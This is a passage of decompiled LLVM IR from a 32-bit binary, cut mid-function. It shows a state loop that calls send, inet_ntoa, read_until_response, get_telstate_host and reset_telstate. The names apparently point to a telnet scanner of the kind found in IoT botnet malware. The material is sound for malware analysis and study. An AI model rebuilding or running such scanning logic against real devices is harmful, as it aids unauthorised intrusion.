  %v0_8051a5c = load i32, i32* @ebx, align 4
  %v2_8051a5c = add i32 %v0_8051a57, -8
  %v3_8051a5c = inttoptr i32 %v2_8051a5c to i32*
  store i32 %v0_8051a5c, i32* %v3_8051a5c, align 4
  %v0_8051a5d = load i32, i32* @esi, align 4
  %v2_8051a5d = add i32 %v0_8051a57, -12
  %v3_8051a5d = inttoptr i32 %v2_8051a5d to i32*
  store i32 %v0_8051a5d, i32* %v3_8051a5d, align 4
  %v0_8051a5e = load i32, i32* %eax.global-to-local, align 4
  %v2_8051a5e = add i32 %v0_8051a57, -16
  %v3_8051a5e = inttoptr i32 %v2_8051a5e to i32*
  store i32 %v0_8051a5e, i32* %v3_8051a5e, align 4
  %v0_8051a5f = load i8*, i8** %stack_var_-636, align 4
  %v1_8051a5f = ptrtoint i8* %v0_8051a5f to i32
  %v6_8051a5f = call i32 @send(i32 %v1_8051a5f, i32 %v0_805191e, i32 %stack_var_-628.250, i32 %stack_var_-624.251)
  %v0_8051a64 = load i32, i32* @esp, align 4
  %v2_8051a67 = icmp slt i32 %v6_8051a5f, 0
  %v1_8051a69 = icmp eq i1 %v2_8051a67, false
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_8051b2b = add i32 %v2_8050cb3, 11
  store i32 %v1_8051b2b, i32* %eax.global-to-local, align 4
  %v1_8051b2e = inttoptr i32 %v1_8051b2b to i8*
  %v2_8051b2e = load i8, i8* %v1_8051b2e, align 1
  %v3_8051b2e = zext i8 %v2_8051b2e to i32
  store i32 %v3_8051b2e, i32* %eax.global-to-local, align 4
  %v1_8051b35 = mul nuw nsw i32 %v3_8051b2e, 4
  %v2_8051b35 = add nuw nsw i32 %v1_8051b35, 134673728
  %v3_8051b35 = inttoptr i32 %v2_8051b35 to i32*
  %v4_8051b35 = load i32, i32* %v3_8051b35, align 4
  store i32 %v4_8051b35, i32* @ebx, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_8051b4f = add i32 %v2_8050cb3, 10
  store i32 %v1_8051b4f, i32* %eax.global-to-local, align 4
  %v1_8051b52 = inttoptr i32 %v1_8051b4f to i8*
  %v2_8051b52 = load i8, i8* %v1_8051b52, align 1
  %v3_8051b52 = zext i8 %v2_8051b52 to i32
  store i32 %v3_8051b52, i32* %eax.global-to-local, align 4
  %v1_8051b59 = mul nuw nsw i32 %v3_8051b52, 4
  %v2_8051b59 = add nuw nsw i32 %v1_8051b59, 134673440
  %v3_8051b59 = inttoptr i32 %v2_8051b59 to i32*
  %v4_8051b59 = load i32, i32* %v3_8051b59, align 4
  store i32 %v4_8051b59, i32* @esi, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_8051b71 = add i32 %v2_8050cb3, 4
  store i32 %v1_8051b71, i32* %eax.global-to-local, align 4
  %v1_8051b77 = inttoptr i32 %v1_8051b71 to i32*
  %v2_8051b77 = load i32, i32* %v1_8051b77, align 4
  %v5_8051b77 = inttoptr i32 %v0_8051a64 to i32*
  store i32 %v2_8051b77, i32* %v5_8051b77, align 4
  %v0_8051b79 = load i8*, i8** %stack_var_-636, align 4
  %v1_8051b79 = ptrtoint i8* %v0_8051b79 to i32
  %v2_8051b79 = call i32 @__GI_inet_ntoa(i32 %v1_8051b79)
  store i32 %v2_8051b79, i32* %eax.global-to-local, align 4
  %v0_8051b7e = load i32, i32* @esp, align 4
  %v0_8051b84 = load i32, i32* @ebx, align 4
  %v2_8051b84 = add i32 %v0_8051b7e, 4
  %v3_8051b84 = inttoptr i32 %v2_8051b84 to i32*
  store i32 %v0_8051b84, i32* %v3_8051b84, align 4
  %v0_8051b85 = load i32, i32* @esi, align 4
  %v3_8051b85 = inttoptr i32 %v0_8051b7e to i32*
  store i32 %v0_8051b85, i32* %v3_8051b85, align 4
  %v2_8051b86 = add i32 %v0_8051b7e, -4
  %v3_8051b86 = inttoptr i32 %v2_8051b86 to i32*
  store i32 %v2_8051b79, i32* %v3_8051b86, align 4
  %v1_8051b87 = add i32 %v0_8051b7e, -8
  %v2_8051b87 = inttoptr i32 %v1_8051b87 to i32*
  store i32 ptrtoint ([7 x i8]* @global_var_806a22b.283 to i32), i32* %v2_8051b87, align 4
  %v1_8051b8c = add i32 %v0_8051b7e, -12
  %v2_8051b8c = inttoptr i32 %v1_8051b8c to i32*
  br i1 %v1_8051a69, label %dec_label_pc_8051b18, label %dec_label_pc_8051a6f

dec_label_pc_8051a6f:                             ; preds = %dec_label_pc_8051a1b
  store i32 ptrtoint ([70 x i8]* @global_var_806a2b4.290 to i32), i32* %v2_8051b8c, align 4
  %v5_8051ae8 = add i32 %v0_8051b7e, -16
  %v6_8051ae8 = inttoptr i32 %v5_8051ae8 to i32*
  store i32 %arg3, i32* %v6_8051ae8, align 4
  %v0_8051aeb = load i8*, i8** %stack_var_-636, align 4
  %v1_8051aeb = ptrtoint i8* %v0_8051aeb to i32
  %v4_8051aeb = call i32 @Send(i32 %v1_8051aeb, i32 %v0_805191e)
  %v0_8051af0 = load i32, i32* @esp, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v2_8051b0a = add i32 %v0_8051af0, 16
  %v3_8051b0a = inttoptr i32 %v2_8051b0a to i32*
  store i32 %v2_8050cb3, i32* %v3_8051b0a, align 4
  %v0_8051b0b = load i8*, i8** %stack_var_-636, align 4
  %v1_8051b0b = ptrtoint i8* %v0_8051b0b to i32
  %v2_8051b0b = call i32 @reset_telstate(i32 %v1_8051b0b)
  store i32 %v2_8051b0b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_8051b18:                             ; preds = %dec_label_pc_8051a1b
  store i32 ptrtoint ([53 x i8]* @global_var_806a2fc.291 to i32), i32* %v2_8051b8c, align 4
  %v5_8051b91 = add i32 %v0_8051b7e, -16
  %v6_8051b91 = inttoptr i32 %v5_8051b91 to i32*
  store i32 %arg3, i32* %v6_8051b91, align 4
  %v0_8051b94 = load i8*, i8** %stack_var_-636, align 4
  %v1_8051b94 = ptrtoint i8* %v0_8051b94 to i32
  %v4_8051b94 = call i32 @Send(i32 %v1_8051b94, i32 %v0_805191e)
  %v0_8051b99 = load i32, i32* @esp, align 4
  %v0_8051b9c = load i32, i32* bitcast ([11 x i8]** @global_var_806f70c.293 to i32*), align 4
  store i32 %v0_8051b9c, i32* @ebx, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_8051bb6 = add i32 %v2_8050cb3, 16
  store i32 %v1_8051bb6, i32* %eax.global-to-local, align 4
  %v1_8051bb9 = add i32 %v2_8050cb3, 19
  %v2_8051bb9 = inttoptr i32 %v1_8051bb9 to i32*
  %v3_8051bb9 = load i32, i32* %v2_8051bb9, align 4
  store i32 %v3_8051bb9, i32* @esi, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v4_8051bcd = load i32, i32* %v3_8051957, align 4
  store i32 %v4_8051bcd, i32* %eax.global-to-local, align 4
  %v2_8051bd3 = add i32 %v0_8051b99, 16
  %v3_8051bd3 = inttoptr i32 %v2_8051bd3 to i32*
  store i32 %v0_8051b9c, i32* %v3_8051bd3, align 4
  %v1_8051bd4 = add i32 %v0_8051b99, 12
  %v2_8051bd4 = inttoptr i32 %v1_8051bd4 to i32*
  store i32 1024, i32* %v2_8051bd4, align 4
  %v0_8051bd9 = load i32, i32* @esi, align 4
  %v2_8051bd9 = add i32 %v0_8051b99, 8
  %v3_8051bd9 = inttoptr i32 %v2_8051bd9 to i32*
  store i32 %v0_8051bd9, i32* %v3_8051bd9, align 4
  %v5_8051bda = add i32 %v0_8051b99, 4
  %v6_8051bda = inttoptr i32 %v5_8051bda to i32*
  store i32 %arg1, i32* %v6_8051bda, align 4
  %v0_8051bdd = load i32, i32* %eax.global-to-local, align 4
  %v3_8051bdd = inttoptr i32 %v0_8051b99 to i32*
  store i32 %v0_8051bdd, i32* %v3_8051bdd, align 4
  %v0_8051bde = load i8*, i8** %stack_var_-636, align 4
  %v1_8051bde = ptrtoint i8* %v0_8051bde to i32
  %v2_8051bde = call i32 @read_until_response(i32 %v1_8051bde)
  %v0_8051be3 = load i32, i32* @esp, align 4
  %v1_8051be6 = icmp eq i32 %v2_8051bde, 0
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  br i1 %v1_8051be6, label %dec_label_pc_8051c97, label %dec_label_pc_8051bee

dec_label_pc_8051bee:                             ; preds = %dec_label_pc_8051b18
  store i32 %v1_8051b2b, i32* %eax.global-to-local, align 4
  %v2_8051c04 = load i8, i8* %v1_8051b2e, align 1
  %v3_8051c04 = zext i8 %v2_8051c04 to i32
  store i32 %v3_8051c04, i32* %eax.global-to-local, align 4
  %v1_8051c0b = mul nuw nsw i32 %v3_8051c04, 4
  %v2_8051c0b = add nuw nsw i32 %v1_8051c0b, 134673728
  %v3_8051c0b = inttoptr i32 %v2_8051c0b to i32*
  %v4_8051c0b = load i32, i32* %v3_8051c0b, align 4
  store i32 %v4_8051c0b, i32* @ebx, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v1_8051b4f, i32* %eax.global-to-local, align 4
  %v2_8051c28 = load i8, i8* %v1_8051b52, align 1
  %v3_8051c28 = zext i8 %v2_8051c28 to i32
  store i32 %v3_8051c28, i32* %eax.global-to-local, align 4
  %v1_8051c2f = mul nuw nsw i32 %v3_8051c28, 4
  %v2_8051c2f = add nuw nsw i32 %v1_8051c2f, 134673440
  %v3_8051c2f = inttoptr i32 %v2_8051c2f to i32*
  %v4_8051c2f = load i32, i32* %v3_8051c2f, align 4
  store i32 %v4_8051c2f, i32* @esi, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v1_8051b71, i32* %eax.global-to-local, align 4
  %v2_8051c4d = load i32, i32* %v1_8051b77, align 4
  %v4_8051c4d = add i32 %v0_8051be3, 16
  %v5_8051c4d = inttoptr i32 %v4_8051c4d to i32*
  store i32 %v2_8051c4d, i32* %v5_8051c4d, align 4
  %v0_8051c4f = load i8*, i8** %stack_var_-636, align 4
  %v1_8051c4f = ptrtoint i8* %v0_8051c4f to i32
  %v2_8051c4f = call i32 @__GI_inet_ntoa(i32 %v1_8051c4f)
  store i32 %v2_8051c4f, i32* %eax.global-to-local, align 4
  %v0_8051c54 = load i32, i32* @esp, align 4
  %v0_8051c5a = load i32, i32* @ebx, align 4
  %v2_8051c5a = add i32 %v0_8051c54, 4
  %v3_8051c5a = inttoptr i32 %v2_8051c5a to i32*
  store i32 %v0_8051c5a, i32* %v3_8051c5a, align 4
  %v0_8051c5b = load i32, i32* @esi, align 4
  %v3_8051c5b = inttoptr i32 %v0_8051c54 to i32*
  store i32 %v0_8051c5b, i32* %v3_8051c5b, align 4
  %v2_8051c5c = add i32 %v0_8051c54, -4
  %v3_8051c5c = inttoptr i32 %v2_8051c5c to i32*
  store i32 %v2_8051c4f, i32* %v3_8051c5c, align 4
  %v1_8051c5d = add i32 %v0_8051c54, -8
  %v2_8051c5d = inttoptr i32 %v1_8051c5d to i32*
  store i32 ptrtoint ([7 x i8]* @global_var_806a22b.283 to i32), i32* %v2_8051c5d, align 4
  %v1_8051c62 = add i32 %v0_8051c54, -12
  %v2_8051c62 = inttoptr i32 %v1_8051c62 to i32*
  store i32 ptrtoint ([61 x i8]* @global_var_806a334.294 to i32), i32* %v2_8051c62, align 4
  %v5_8051c67 = add i32 %v0_8051c54, -16
  %v6_8051c67 = inttoptr i32 %v5_8051c67 to i32*
  store i32 %arg3, i32* %v6_8051c67, align 4
  %v0_8051c6a = load i8*, i8** %stack_var_-636, align 4
  %v1_8051c6a = ptrtoint i8* %v0_8051c6a to i32
  %v4_8051c6a = call i32 @Send(i32 %v1_8051c6a, i32 %v0_805191e)
  %v0_8051c6f = load i32, i32* @esp, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v2_8051c89 = add i32 %v0_8051c6f, 16
  %v3_8051c89 = inttoptr i32 %v2_8051c89 to i32*
  store i32 %v2_8050cb3, i32* %v3_8051c89, align 4
  %v0_8051c8a = load i8*, i8** %stack_var_-636, align 4
  %v1_8051c8a = ptrtoint i8* %v0_8051c8a to i32
  %v2_8051c8a = call i32 @reset_telstate(i32 %v1_8051c8a)
  store i32 %v2_8051c8a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_8051c97:                             ; preds = %dec_label_pc_8051b18
  %v5_8051ca8 = load i32, i32* %v4_8050c76, align 4
  store i32 %v5_8051ca8, i32* %eax.global-to-local, align 4
  %v1_8051cac = add i32 %v5_8051ca8, 60
  store i32 %v1_8051cac, i32* @ebx, align 4
  %v1_8051cb2 = add i32 %v0_8051be3, 16
  %v2_8051cb2 = inttoptr i32 %v1_8051cb2 to i32*
  store i32 0, i32* %v2_8051cb2, align 4
  %v0_8051cb4 = load i8*, i8** %stack_var_-636, align 4
  %tmp42 = bitcast i8* %v0_8051cb4 to i32*
  %v3_8051cb4 = call i32 @__GI_time(i32* %tmp42)
  store i32 %v3_8051cb4, i32* %eax.global-to-local, align 4
  %v0_8051cb9 = load i32, i32* @esp, align 4
  %v0_8051cbc = load i32, i32* @ebx, align 4
  %v7_8051cbc = icmp ult i32 %v0_8051cbc, %v3_8051cb4
  %v1_8051cbe = icmp eq i1 %v7_8051cbc, false
  br i1 %v1_8051cbe, label %dec_label_pc_8051d87, label %dec_label_pc_8051cc4

dec_label_pc_8051cc4:                             ; preds = %dec_label_pc_8051c97
  %v1_8051cb9 = add i32 %v0_8051cb9, 16
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_8051cd7 = add i32 %v2_8050cb3, 9
  store i32 %v1_8051cd7, i32* %eax.global-to-local, align 4
  %v1_8051cda = inttoptr i32 %v1_8051cd7 to i8*
  %v2_8051cda = load i8, i8* %v1_8051cda, align 1
  %v3_8051cda = zext i8 %v2_8051cda to i32
  %v5_8051cda = and i32 %v1_8051cd7, -256
  %v6_8051cda = or i32 %v3_8051cda, %v5_8051cda
  store i32 %v6_8051cda, i32* %eax.global-to-local, align 4
  %v10_8051cdc = icmp eq i8 %v2_8051cda, 3
  br i1 %v10_8051cdc, label %dec_label_pc_8051d67, label %dec_label_pc_8051ce4

dec_label_pc_8051ce4:                             ; preds = %dec_label_pc_8051cc4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v1_8051b2b, i32* %eax.global-to-local, align 4
  %v2_8051cfa = load i8, i8* %v1_8051b2e, align 1
  %v3_8051cfa = zext i8 %v2_8051cfa to i32
  store i32 %v3_8051cfa, i32* %eax.global-to-local, align 4
  %v1_8051d01 = mul nuw nsw i32 %v3_8051cfa, 4
  %v2_8051d01 = add nuw nsw i32 %v1_8051d01, 134673728
  %v3_8051d01 = inttoptr i32 %v2_8051d01 to i32*
  %v4_8051d01 = load i32, i32* %v3_8051d01, align 4
  store i32 %v4_8051d01, i32* @ebx, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v1_8051b4f, i32* %eax.global-to-local, align 4
  %v2_8051d1e = load i8, i8* %v1_8051b52, align 1
  %v3_8051d1e = zext i8 %v2_8051d1e to i32
  store i32 %v3_8051d1e, i32* %eax.global-to-local, align 4
  %v1_8051d25 = mul nuw nsw i32 %v3_8051d1e, 4
  %v2_8051d25 = add nuw nsw i32 %v1_8051d25, 134673440
  %v3_8051d25 = inttoptr i32 %v2_8051d25 to i32*
  %v4_8051d25 = load i32, i32* %v3_8051d25, align 4
  store i32 %v4_8051d25, i32* @esi, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v3_8051d43 = inttoptr i32 %v0_8051cb9 to i32*
  store i32 %v2_8050cb3, i32* %v3_8051d43, align 4
  %v0_8051d44 = call i32 @get_telstate_host()
  store i32 %v0_8051d44, i32* %eax.global-to-local, align 4
  %v0_8051d49 = load i32, i32* @esp, align 4
  %v0_8051d4f = load i32, i32* @ebx, align 4
  %v2_8051d4f = add i32 %v0_8051d49, 4
  %v3_8051d4f = inttoptr i32 %v2_8051d4f to i32*
  store i32 %v0_8051d4f, i32* %v3_8051d4f, align 4
  %v0_8051d50 = load i32, i32* @esi, align 4
  %v3_8051d50 = inttoptr i32 %v0_8051d49 to i32*
  store i32 %v0_8051d50, i32* %v3_8051d50, align 4
  %v2_8051d51 = add i32 %v0_8051d49, -4
  %v3_8051d51 = inttoptr i32 %v2_8051d51 to i32*
  store i32 %v0_8051d44, i32* %v3_8051d51, align 4
  %v1_8051d52 = add i32 %v0_8051d49, -8
  %v2_8051d52 = inttoptr i32 %v1_8051d52 to i32*
  store i32 ptrtoint ([7 x i8]* @global_var_806a22b.283 to i32), i32* %v2_8051d52, align 4
  %v1_8051d57 = add i32 %v0_8051d49, -12
  %v2_8051d57 = inttoptr i32 %v1_8051d57 to i32*
  store i32 ptrtoint ([57 x i8]* @global_var_806a374.295 to i32), i32* %v2_8051d57, align 4
  %v5_8051d5c = add i32 %v0_8051d49, -16
  %v6_8051d5c = inttoptr i32 %v5_8051d5c to i32*
  store i32 %arg3, i32* %v6_8051d5c, align 4
  %v0_8051d5f = load i8*, i8** %stack_var_-636, align 4
  %v1_8051d5f = ptrtoint i8* %v0_8051d5f to i32
  %v4_8051d5f = call i32 @Send(i32 %v1_8051d5f, i32 %v0_805191e)
  store i32 %v4_8051d5f, i32* %eax.global-to-local, align 4
  %v0_8051d64 = load i32, i32* @esp, align 4
  %v1_8051d64 = add i32 %v0_8051d64, 32
  br label %dec_label_pc_8051d67

dec_label_pc_8051d67:                             ; preds = %dec_label_pc_8051cc4, %dec_label_pc_8051ce4
  %v0_8051d7b = phi i32 [ %v1_8051cb9, %dec_label_pc_8051cc4 ], [ %v1_8051d64, %dec_label_pc_8051ce4 ]
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v2_8051d7e = add i32 %v0_8051d7b, -16
  %v3_8051d7e = inttoptr i32 %v2_8051d7e to i32*
  store i32 %v2_8050cb3, i32* %v3_8051d7e, align 4
  %v0_8051d7f = load i8*, i8** %stack_var_-636, align 4
  %v1_8051d7f = ptrtoint i8* %v0_8051d7f to i32
  %v2_8051d7f = call i32 @reset_telstate(i32 %v1_8051d7f)
  store i32 %v2_8051d7f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_8051d87:                             ; preds = %dec_label_pc_8050ca2, %dec_label_pc_8051c97, %dec_label_pc_80518a8, %dec_label_pc_80517b9, %dec_label_pc_805154c, %dec_label_pc_80512e5, %dec_label_pc_80511a9, %dec_label_pc_8050e70, %dec_label_pc_8051bee, %dec_label_pc_8051a6f, %dec_label_pc_8051972, %dec_label_pc_80518d5, %dec_label_pc_8051883, %dec_label_pc_80517d9, %dec_label_pc_8051765, %dec_label_pc_80516a2, %dec_label_pc_805167d, %dec_label_pc_805162b, %dec_label_pc_8051579, %dec_label_pc_8051525, %dec_label_pc_80514fe, %dec_label_pc_805143b, %dec_label_pc_8051416, %dec_label_pc_80513c4, %dec_label_pc_8051312, %dec_label_pc_80512be, %dec_label_pc_8051297, %dec_label_pc_80511d6, %dec_label_pc_8051184, %dec_label_pc_805110b, %dec_label_pc_80510e6, %dec_label_pc_8050fb0, %dec_label_pc_8050f8b, %dec_label_pc_8050e52, %dec_label_pc_8050e18, %dec_label_pc_8051d67
  %stack_var_-628.1 = phi i32 [ %stack_var_-628.250, %dec_label_pc_8050ca2 ], [ %stack_var_-628.250, %dec_label_pc_8051c97 ], [ %stack_var_-628.250, %dec_label_pc_8051d67 ], [ %stack_var_-628.250, %dec_label_pc_8051bee ], [ %stack_var_-628.250, %dec_label_pc_8051a6f ], [ %stack_var_-628.250, %dec_label_pc_8051972 ], [ %stack_var_-628.250, %dec_label_pc_80518a8 ], [ %stack_var_-628.250, %dec_label_pc_80518d5 ], [ %stack_var_-628.250, %dec_label_pc_8051883 ], [ %stack_var_-628.250, %dec_label_pc_80517b9 ], [ %stack_var_-628.250, %dec_label_pc_80517d9 ], [ %stack_var_-628.250, %dec_label_pc_8051765 ], [ %v4_80515bb, %dec_label_pc_80516a2 ], [ %v4_80515bb, %dec_label_pc_805167d ], [ %v4_80515bb, %dec_label_pc_805162b ], [ %stack_var_-628.250, %dec_label_pc_805154c ], [ %stack_var_-628.250, %dec_label_pc_8051579 ], [ %stack_var_-628.250, %dec_label_pc_8051525 ], [ %stack_var_-628.250, %dec_label_pc_80514fe ], [ %stack_var_-628.250, %dec_label_pc_805143b ], [ %stack_var_-628.250, %dec_label_pc_8051416 ], [ %stack_var_-628.250, %dec_label_pc_80513c4 ], [ %stack_var_-628.250, %dec_label_pc_80512e5 ], [ %stack_var_-628.250, %dec_label_pc_8051312 ], [ %stack_var_-628.250, %dec_label_pc_80512be ], [ %stack_var_-628.250, %dec_label_pc_8051297 ], [ %stack_var_-628.250, %dec_label_pc_80511a9 ], [ %stack_var_-628.250, %dec_label_pc_80511d6 ], [ %stack_var_-628.250, %dec_label_pc_8051184 ], [ %stack_var_-628.250, %dec_label_pc_805110b ], [ %stack_var_-628.250, %dec_label_pc_80510e6 ], [ %stack_var_-628.250, %dec_label_pc_8050e70 ], [ %stack_var_-628.250, %dec_label_pc_8050fb0 ], [ %stack_var_-628.250, %dec_label_pc_8050f8b ], [ %stack_var_-628.250, %dec_label_pc_8050e52 ], [ %stack_var_-628.250, %dec_label_pc_8050e18 ]
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.251, %dec_label_pc_8050ca2 ], [ %stack_var_-624.251, %dec_label_pc_8051c97 ], [ %stack_var_-624.251, %dec_label_pc_8051d67 ], [ %stack_var_-624.251, %dec_label_pc_8051bee ], [ %stack_var_-624.251, %dec_label_pc_8051a6f ], [ %stack_var_-624.251, %dec_label_pc_8051972 ], [ %stack_var_-624.251, %dec_label_pc_80518a8 ], [ %stack_var_-624.251, %dec_label_pc_80518d5 ], [ %stack_var_-624.251, %dec_label_pc_8051883 ], [ %stack_var_-624.251, %dec_label_pc_80517b9 ], [ %stack_var_-624.251, %dec_label_pc_80517d9 ], [ %stack_var_-624.251, %dec_label_pc_8051765 ], [ %stack_var_-624.251, %dec_label_pc_80516a2 ], [ %stack_var_-624.251, %dec_label_pc_805167d ], [ %stack_var_-624.251, %dec_label_pc_805162b ], [ %stack_var_-624.251, %dec_label_pc_805154c ], [ %stack_var_-624.251, %dec_label_pc_8051579 ], [ %stack_var_-624.251, %dec_label_pc_8051525 ], [ %stack_var_-624.251, %dec_label_pc_80514fe ], [ %v4_8051354, %dec_label_pc_805143b ], [ %v4_8051354, %dec_label_pc_8051416 ], [ %v4_8051354, %dec_label_pc_80513c4 ], [ %stack_var_-624.251, %dec_label_pc_80512e5 ], [ %stack_var_-624.251, %dec_label_pc_8051312 ], [ %stack_var_-624.251, %dec_label_pc_80512be ], [ %stack_var_-624.251, %dec_label_pc_8051297 ], [ %stack_var_-624.251, %dec_label_pc_80511a9 ], [ %stack_var_-624.251, %dec_label_pc_80511d6 ], [ %stack_var_-624.251, %dec_label_pc_8051184 ], [ %stack_var_-624.251, %dec_label_pc_805110b ], [ %stack_var_-624.251, %dec_label_pc_80510e6 ], [ %stack_var_-624.251, %dec_label_pc_8050e70 ], [ %stack_var_-624.251, %dec_label_pc_8050fb0 ], [ %stack_var_-624.251, %dec_label_pc_8050f8b ], [ %stack_var_-624.251, %dec_label_pc_8050e52 ], [ %stack_var_-624.251, %dec_label_pc_8050e18 ]
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.252, %dec_label_pc_8050ca2 ], [ %stack_var_-24.252, %dec_label_pc_8051c97 ], [ %stack_var_-24.252, %dec_label_pc_8051d67 ], [ %stack_var_-24.252, %dec_label_pc_8051bee ], [ %stack_var_-24.252, %dec_label_pc_8051a6f ], [ %stack_var_-24.252, %dec_label_pc_8051972 ], [ %stack_var_-24.252, %dec_label_pc_80518a8 ], [ %stack_var_-24.252, %dec_label_pc_80518d5 ], [ %stack_var_-24.252, %dec_label_pc_8051883 ], [ %stack_var_-24.252, %dec_label_pc_80517b9 ], [ %stack_var_-24.252, %dec_label_pc_80517d9 ], [ %stack_var_-24.252, %dec_label_pc_8051765 ], [ %stack_var_-24.252, %dec_label_pc_80516a2 ], [ %stack_var_-24.252, %dec_label_pc_805167d ], [ %stack_var_-24.252, %dec_label_pc_805162b ], [ %stack_var_-24.252, %dec_label_pc_805154c ], [ %stack_var_-24.252, %dec_label_pc_8051579 ], [ %stack_var_-24.252, %dec_label_pc_8051525 ], [ %stack_var_-24.252, %dec_label_pc_80514fe ], [ %stack_var_-24.252, %dec_label_pc_805143b ], [ %stack_var_-24.252, %dec_label_pc_8051416 ], [ %stack_var_-24.252, %dec_label_pc_80513c4 ], [ %stack_var_-24.252, %dec_label_pc_80512e5 ], [ %stack_var_-24.252, %dec_label_pc_8051312 ], [ %stack_var_-24.252, %dec_label_pc_80512be ], [ %stack_var_-24.252, %dec_label_pc_8051297 ], [ %v6_8050fe8, %dec_label_pc_80511a9 ], [ %v6_8050fe8, %dec_label_pc_80511d6 ], [ %v6_8050fe8, %dec_label_pc_8051184 ], [ %v6_8050fe8, %dec_label_pc_805110b ], [ %v6_8050fe8, %dec_label_pc_80510e6 ], [ %stack_var_-24.252, %dec_label_pc_8050e70 ], [ %stack_var_-24.252, %dec_label_pc_8050fb0 ], [ %stack_var_-24.252, %dec_label_pc_8050f8b ], [ %stack_var_-24.252, %dec_label_pc_8050e52 ], [ %stack_var_-24.252, %dec_label_pc_8050e18 ]
  %v4_8051d87 = add nuw nsw i32 %storemerge53, 1
  store i32 %v4_8051d87, i32* %eax.global-to-local, align 4
  %v5_8051d90 = icmp slt i32 %v4_8051d87, %stack_var_-56.0
  br i1 %v5_8051d90, label %dec_label_pc_8050c65, label %dec_label_pc_8050c59

dec_label_pc_8051d9b:                             ; preds = %entry
  %v2_8051da4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051da4, i32* @ebx, align 4
  store i32 %v0_8050af9, i32* @esi, align 4
  store i32 %v0_8050af8, i32* @edi, align 4
  ret i32 %v1_8050b09

; uselistorder directives
  uselistorder i32 %v4_8051d87, { 2, 1, 0 }
  uselistorder i32 %stack_var_-24.1, { 1, 0 }
  uselistorder i32 %stack_var_-624.1, { 1, 0 }
  uselistorder i32 %stack_var_-628.1, { 1, 0 }
  uselistorder i32 %v0_8051be3, { 1, 0 }
  uselistorder i32 %v0_8051b99, { 4, 0, 1, 2, 3 }
  uselistorder i32* %v2_8051b8c, { 1, 0 }
  uselistorder i32 %v0_8051b7e, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_80517ae, { 1, 0 }
  uselistorder i32 %v0_805175e, { 1, 2, 0 }
  uselistorder i32* %v1_8051720, { 1, 0, 2 }
  uselistorder i32 %v0_8051676, { 1, 0, 2 }
  uselistorder i32 %v0_8051624, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_80515bb, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_805153c, { 1, 0 }
  uselistorder i32 %v0_80514f7, { 1, 2, 0 }
  uselistorder i32* %v1_80514b9, { 1, 0, 2 }
  uselistorder i32 %v0_805140f, { 1, 0, 2 }
  uselistorder i32 %v0_80513bd, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_8051354, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_80512d5, { 1, 0 }
  uselistorder i32 %v0_8051290, { 1, 2, 0 }
  uselistorder i32 %v0_8051154, { 1, 0 }
  uselistorder i32 %v13_8051131, { 1, 0 }
  uselistorder i32 %v0_805112c, { 2, 0, 1 }
  uselistorder i32 %v5_8051068, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_805101d, { 1, 0 }
  uselistorder i32 %v2_8051006, { 1, 0 }
  uselistorder i32 %v0_8050fc4, { 1, 0 }
  uselistorder i32 %v0_8050f4e, { 2, 0, 1 }
  uselistorder i32 %v12_8050f2b, { 1, 0 }
  uselistorder i32 %v0_8050f26, { 2, 0, 1 }
  uselistorder i32 %v5_8050eb7, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v0_8050ea3, { 2, 0, 1 }
  uselistorder i32 %v3_8050d15, { 0, 2, 1 }
  uselistorder i32 %v3_8050cb8, { 9, 8, 6, 7, 5, 3, 4, 2, 1, 11, 10, 12, 0 }
  uselistorder i32 %v2_8050cb3, { 58, 59, 60, 61, 62, 63, 64, 66, 65, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 56, 38, 39, 40, 41, 42, 43, 32, 33, 34, 35, 37, 36, 26, 27, 28, 29, 30, 31, 20, 21, 22, 23, 25, 24, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 8, 11, 78 }
  uselistorder i32* %v4_8050c76, { 5, 4, 3, 2, 0, 1, 6 }
  uselistorder i32 %v2_8050c74, { 7, 6, 5, 4, 9, 8, 11, 10, 13, 12, 15, 14, 17, 16, 24, 23, 22, 21, 20, 19, 18, 29, 28, 27, 26, 0, 25, 1, 2, 3 }
